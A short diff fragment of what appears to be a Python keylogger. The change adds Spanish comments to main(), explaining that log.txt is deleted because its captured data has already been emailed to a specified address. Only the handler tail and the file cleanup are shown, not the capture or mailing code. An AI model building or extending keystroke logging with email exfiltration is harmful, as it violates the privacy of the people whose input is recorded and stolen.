@@ -205,7 +205,8 @@ def on_release(key):
         return False #interrumpe el programa 
     
 def main(): # La función principal en Python actúa como el punto de ejecución de cualquier programa.
-    if os.path.exists("log.txt"):
+    if os.path.exists("log.txt"): #os verifica si existe log.txt, si es = verdad entonces "os" procede a eliminar 
+        #el log.txt ya que los datos fueron mandsdos al correo-e senalado 
         os.remove("log.txt")
     else:  
         pass 
